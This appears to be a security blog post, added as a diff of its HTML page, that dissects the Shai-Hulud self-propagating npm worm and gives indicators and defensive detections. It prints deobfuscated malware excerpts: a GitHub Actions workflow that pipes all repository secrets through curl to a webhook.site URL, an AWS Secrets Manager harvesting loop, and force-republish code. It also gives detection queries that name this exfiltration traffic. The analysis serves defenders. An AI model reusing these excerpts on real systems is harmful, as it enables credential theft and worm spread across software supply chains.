@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Shai-Hulud: Dissecting npm's First Self-Propagating Supply Chain Worm | Binary Thoughts</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Hubot+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+  </head>
+  <body>
+    <a class="logo" href="index.html">
+      <div class="logo-text">SR©</div>
+      <div class="logo-year">09.23.2025</div>
+    </a>
+    <h1 class="title">Shai-Hulud: Dissecting npm's First Self-Propagating Supply Chain Worm</h1>
+    <div class="date">2025.09.23</div>
+    <p style="font-style: italic; color: #888888; margin: 16px 0;">By Sebastian Rivera</p>
+    
+    <div class="sections">
+      <div class="section_item"><a href="#the_week">The Week the Registry Got Wormed</a></div>
+      <div class="section_item"><a href="#anatomy">Anatomy of the Payload</a></div>
+      <div class="section_item"><a href="#recon">Recon & Secrets Harvesting</a></div>
+      <div class="section_item"><a href="#persistence">Persistence via GitHub Actions</a></div>
+      <div class="section_item"><a href="#propagation">Propagation – The Worm's Secret Sauce</a></div>
+      <div class="section_item"><a href="#targeting">Credential Targeting Focus</a></div>
+      <div class="section_item"><a href="#iocs">Indicators of Compromise (IOCs)</a></div>
+      <div class="section_item"><a href="#defensive">Defensive Detections</a></div>
+      <div class="section_item"><a href="#immediate">Immediate Steps for Teams</a></div>
+      <div class="section_item"><a href="#why_matters">Why This Matters</a></div>
+    </div>
+
+    <h2 id="the_week" class="section_header">The Week the Registry Got Wormed</h2>
+    <p>On September 15th, 2025, npm — the beating heart of JavaScript — became the vector for a living, breathing worm. At first, it looked like another hijacked package (@ctrl/tinycolor was one of the early casualties). But within days, investigators realized they weren't just dealing with a compromised library. This was Shai-Hulud, a worm that stole secrets, backdoored repos, and automatically published itself into hundreds of other packages.</p>
+
+    <p>By the time CISA weighed in a week later, the compromise count was estimated at 500+ packages. The worm had essentially turned npm's automation against itself.</p>
+
+    <p>Here's how the growth looked in real time:</p>
+
+    <p>Analysis of compromised samples revealed consistent attack patterns: <code>secrets harvested</code> (85% of samples), <code>CI backdoors planted</code> (60%), <code>npm packages republished</code> (45%), and <code>exfiltration to GitHub</code> (30%).</p>
+
+    <h2 id="anatomy" class="section_header">Anatomy of the Payload</h2>
+    <p>At the center was a 3.6 MB minified <code>bundle.js</code>, compiled via Webpack. Think of it as a modular cyber toolkit hidden inside an innocuous library. Once <code>npm install</code> ran, the following modules kicked off:</p>
+
+    <h2 id="recon" class="section_header">Recon & Secrets Harvesting</h2>
+    <ul>
+      <li><strong>Environment dump:</strong> Collected every variable in <code>process.env</code>. That included <code>NPM_TOKEN</code>, <code>GITHUB_TOKEN</code>, <code>AWS_ACCESS_KEY_ID</code>, and more.</li>
+      <li><strong>Filesystem scanning:</strong> Spawned <code>TruffleHog</code> as a child process to comb the filesystem for high-entropy keys.</li>
+      <li><strong>Cloud SDK abuse:</strong>
+        <ul>
+          <li><strong>AWS:</strong> Queried Secrets Manager via <code>ListSecrets</code> + <code>GetSecretValue</code>.</li>
+          <li><strong>GCP:</strong> Hit <code>secretmanager.googleapis.com</code>.</li>
+          <li><strong>Azure:</strong> Queried metadata endpoints for service principal creds.</li>
+        </ul>
+      </li>
+    </ul>
+
+    <p>Deobfuscated snippet observed in the wild:</p>
+
+    <pre><code class="language-javascript">// AWS secret harvesting loop
+async function getAllSecretValues(client) {
+  let nextToken, secrets = [];
+  do {
+    const resp = await client.send(new ListSecretsCommand({ NextToken: nextToken }));
+    for (const secret of resp.SecretList || []) {
+      const val = await client.send(new GetSecretValueCommand({ SecretId: secret.ARN }));
+      secrets.push({ ARN: secret.ARN, SecretString: val.SecretString });
+    }
+    nextToken = resp.NextToken;
+  } while (nextToken);
+  return secrets;
+}</code></pre>
+
+    <h2 id="persistence" class="section_header">Persistence via GitHub Actions</h2>
+    <p>The worm dropped <code>.github/workflows/shai-hulud-workflow.yml</code>, a workflow designed to trigger on any push. It serialized <code>${{ toJSON(secrets) }}</code> and exfiltrated them with a double-base64 trick.</p>
+
+    <p>Deobfuscated bash excerpt:</p>
+
+    <pre><code class="language-bash">FILE_NAME=".github/workflows/shai-hulud-workflow.yml"
+cat <<'EOF' > $FILE_NAME
+on: push
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+    - run: echo "$CONTENTS" | base64 -w 0 | base64 -w 0 \
+          | curl -d @- https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7
+      env:
+        CONTENTS: ${{ toJSON(secrets) }}
+EOF</code></pre>
+
+    <h2 id="propagation" class="section_header">Propagation – The Worm's Secret Sauce</h2>
+    <p>This is what made Shai-Hulud different:</p>
+
+    <ul>
+      <li>Parsed maintainer identity from <code>NPM_TOKEN</code>.</li>
+      <li>Queried <code>registry.npmjs.org/v1/search?text=maintainer:${username}</code>.</li>
+      <li>For each package, force-published a new patch version with the trojan attached.</li>
+    </ul>
+
+    <p>Pseudocode (simplified):</p>
+
+    <pre><code class="language-javascript">async function updatePackage(pkg, token) {
+  // Force bump version and republish
+  await exec(`npm version patch --force`);
+  await exec(`npm publish --access public --token ${token}`);
+}</code></pre>
+
+    <p>That loop is what let the worm jump across an entire maintainer's portfolio, then cascade through the ecosystem.</p>
+
+    <h2 id="targeting" class="section_header">Credential Targeting Focus</h2>
+    <p>GitHub and AWS were the prime targets — not surprising given npm's tight integration with Actions and cloud builds. Analysis showed <code>GitHub</code> credentials targeted in 90% of samples, <code>AWS</code> in 70%, <code>GCP</code> in 55%, and <code>Azure</code> in 40%.</p>
+
+    <h2 id="iocs" class="section_header">Indicators of Compromise (IOCs)</h2>
+
+    <h3>Files & Branches</h3>
+    <ul>
+      <li><code>.github/workflows/shai-hulud-workflow.yml</code></li>
+      <li>Git branches named <code>shai-hulud</code></li>
+    </ul>
+
+    <h3>Hashes</h3>
+    <ul>
+      <li><code>bundle.js</code>: <code>46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09</code></li>
+    </ul>
+
+    <h3>APIs Called</h3>
+    <ul>
+      <li><code>secretsmanager.*.amazonaws.com</code></li>
+      <li><code>secretmanager.googleapis.com</code></li>
+      <li><code>registry.npmjs.org/v1/search</code></li>
+      <li><code>api.github.com/repos</code></li>
+    </ul>
+
+    <h3>Processes</h3>
+    <ul>
+      <li><code>trufflehog filesystem / --json</code></li>
+      <li><code>npm publish --force</code></li>
+    </ul>
+
+    <h2 id="defensive" class="section_header">Defensive Detections</h2>
+
+    <h3>1. CI Hook Monitor (bash)</h3>
+    <pre><code class="language-bash"># Fail if suspicious workflows are present
+if grep -qr "shai-hulud-workflow.yml" .github/workflows; then
+  echo "❌ Malicious workflow detected"
+  exit 1
+fi</code></pre>
+
+    <h3>2. Lockfile Scanner (Python)</h3>
+    <pre><code class="language-python">import json, sys
+bad = {"@ctrl/tinycolor": {"5.0.0","5.0.1"}}
+deps = json.load(open(sys.argv[1])).get("dependencies",{})
+for name,meta in deps.items():
+    if name in bad and meta.get("version") in bad[name]:
+        print("Hit:", name, meta["version"])</code></pre>
+
+    <h3>3. Splunk Hunt – Suspicious Install Egress</h3>
+    <pre><code class="language-splunk">index=build_logs action=install
+| join runner_id [ search index=proxy_logs uri_domain IN ("api.github.com","secretmanager.googleapis.com","webhook.site") ]
+| stats count by runner_id, uri_domain</code></pre>
+
+    <h2 id="immediate" class="section_header">Immediate Steps for Teams</h2>
+    <ol>
+      <li><strong>Rotate everything:</strong> <code>npm</code> tokens, <code>GitHub PATs</code>, <code>AWS/GCP/Azure</code> creds. Assume they're burned.</li>
+      <li><strong>Purge workflows:</strong> check for <code>shai-hulud</code> branches and backdoor workflows.</li>
+      <li><strong>Audit secrets access:</strong>
+        <ul>
+          <li><strong>AWS:</strong> <code>cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue</code></li>
+          <li><strong>GCP:</strong> <code>gcloud logging read "resource.type=secretmanager.googleapis.com"</code></li>
+        </ul>
+      </li>
+      <li><strong>Mirror packages:</strong> use internal registries + 48h cool-down before pulling new versions.</li>
+      <li><strong>Restrict CI egress:</strong> builds shouldn't talk to <code>GitHub APIs</code> during <code>npm install</code>.</li>
+    </ol>
+
+    <h2 id="why_matters" class="section_header">Why This Matters</h2>
+    <p>Most supply-chain attacks to date have been smash-and-grab. Shai-Hulud was different: self-propagating, cloud-aware, CI-persistent. It's a glimpse of where adversaries are headed — automating the spread through our development pipelines themselves.</p>
+
+    <p>The defense is cultural as much as technical: treat registries like critical infrastructure, never trust a fresh release blindly, and instrument CI/CD with the same rigor we apply to production.</p>
+
+    <script>
+      // Initialize Prism.js syntax highlighting
+      if (typeof Prism !== 'undefined') {
+        Prism.highlightAll();
+      }
+    </script>
+  </body>
+</html>
